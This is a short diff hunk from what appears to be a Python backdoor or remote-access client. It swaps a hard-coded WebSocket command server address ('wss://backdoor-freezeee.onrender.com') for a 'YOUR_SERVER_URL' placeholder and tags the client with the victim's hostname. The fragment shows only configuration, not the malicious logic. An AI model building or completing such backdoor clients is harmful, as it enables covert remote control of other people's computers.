@@ -12,7 +12,7 @@ import shutil
 
 current_exe = sys.executable
 
-server_url = "wss://backdoor-freezeee.onrender.com"
+server_url = "YOUR_SERVER_URL"
 CLIENT_NAME = socket.gethostname()
 
 current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
